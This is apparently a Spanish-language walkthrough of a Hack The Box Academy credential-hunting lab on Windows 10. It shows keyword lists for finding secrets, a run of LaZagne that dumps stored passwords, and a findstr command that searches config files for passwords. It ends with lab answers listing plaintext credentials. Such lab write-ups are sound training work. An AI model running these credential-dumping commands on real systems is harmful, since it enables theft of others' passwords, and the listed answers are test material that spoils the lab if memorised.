Vamos a ponernos en un escenario en el que tengamos acceso como administrador al puesto de trabajo de un administrador de IT con windows10.

Centraremos nuestra búsqueda de credenciales en conceptos como:

```
Passwords
Passphrases
Keys
Username
User account
Creds
Users
Passkeys
configuration
dbcredential
dbpassword
pwd
Login
Credentials
```

## Estrategia 1. Herramineta "buscar" de windows (muy básico)
Presionando la tecla windows accedo al menú de búsqueda. En este, puedo escribir palabras claves (como las listadas anteriormente) para acceder a dichas archivos críticos.


## Estrategia 2. Utilizar herramientas de terceros como "LaZagne"

Podemos aprovechar herramientas de terceros como LaZagne para descubrir rápidamente credenciales que los navegadores web u otras aplicaciones instaladas puedan almacenar de forma insegura. LaZagne está compuesta por módulos que apuntan a diferentes programas al buscar contraseñas. Algunos de los módulos comunes se describen en la tabla a continuación:

| Módulo   | Descripción                                                                                                                      |
| -------- | -------------------------------------------------------------------------------------------------------------------------------- |
| browsers | Extrae contraseñas de varios navegadores, incluidos Chromium, Firefox, Microsoft Edge y Opera                                    |
| chats    | Extrae contraseñas de varias aplicaciones de mensajería, incluido Skype                                                          |
| mails    | Busca contraseñas en buzones de correo, incluidos Outlook y Thunderbird                                                          |
| memory   | Vuelca contraseñas desde la memoria, orientado a KeePass y LSASS                                                                 |
| sysadmin | Extrae contraseñas de los archivos de configuración de diversas herramientas de administración del sistema como OpenVPN y WinSCP |
| windows  | Extrae credenciales específicas de Windows, apuntando a secretos LSA, el Administrador de credenciales y más                     |
| wifi     | Vuelca credenciales de WiFi                                                                                                      |
Una vez que LaZagne.exe esté instalado en el objetivo, podemos abrir el símbolo del sistema o PowerShell, navegar al directorio donde se cargó el archivo y ejecutar el siguiente comando:
```cmd-session
C:\Users\bob\Desktop> start LaZagne.exe all
```

Dándonos como salida:
```
|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|


########## User: bob ##########

------------------- Winscp passwords -----------------

[+] Password found !!!
URL: 10.129.202.51
Login: admin
Password: SteveisReallyCool123
Port: 22
```

## Estrategia 3: Usar findstr
También podemos usar findstr para buscar patrones en diversos tipos de archivos. Teniendo en cuenta los términos clave comunes, podemos usar variaciones de este comando para descubrir credenciales en un destino Windows:
```
C:\> findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
```

---
 **RDP to 10.129.202.99 (ACADEMY-PWATTACKS-WIN10CHUNTING) with user "Bob" and password "HTB_@cademy_stdnt!"
**1. What password does Bob use to connect to the Switches via SSH? (Format: Case-Sensitive)**
Simplemente, entro por RDP a la sesión del usuario y observo una carpeta en el escritorio que dentro contiene un excel con credenciales en texto plano. Viendo que la respuesta es: **WellConnected123"

**2. What is the GitLab access code Bob uses? (Format: Case-Sensitive)**
En la misma carpeta, existe un .txt que contiene en texto plano dicha información:
3z1ePfGbjWPsTfCsZfjy

**3.What credentials does Bob use with WinSCP to connect to the file server? (Format: username:password, Case-Sensitive)**

En la máquina Kali Linux atacante me descargo "LaZagne.exe".
Desde la ruta donde se encuentre el ejecutable .exe lo comparto por servidor http con :
```
┌─[eu-academy-3]─[10.10.15.71]─[htb-ac-1876550@htb-qptrlbwgrk]─[~/Downloads]
└──╼ [★]$ python3 -m http.server 8000
```

En la máquina Windows atacante, abro firefox y acudo a:
```
<ip_maquina_linux>:8000
```
Y me descargo el archivo LaZagne.exe.

Como tengo privilegios de administrador lo instalo.
Abro un cmd como administrador y ejecuto:

```
C:\Windows\system32>cd C:\Users\bob\Downloads
C:\Users\bob\Downloads>start LaZagne.exe all
```
Y me devuelve:

```
########## User: bob ##########
------------------- Winscp passwords -----------------
[+] Password found !!!
URL: 10.129.202.64
Login: ubuntu
Password: FSadmin123
Port: 22                                                                                    
```

Siendo la solución del ejercicio: ubuntu:FSadmin123

**3. What is the default password of every newly created Inlanefreight Domain user account? (Format: Case-Sensitive)**
En la carpeta: "C:\Automations&Scripts" existe un fichero llamado BulkaddAusers que tiene la respuesta:
2Inlanefreightisgreat2022"


4.  What are the credentials to access the Edge-Router? (Format: username:password, Case-Sensitive)**
Existe un archivo llamado "EdgeRouterConfigs" en "C:\Automations&Scripts\AnsibleScripts", que contiene dicha información:
```
edgeadmin:Edge@dmin123!
```

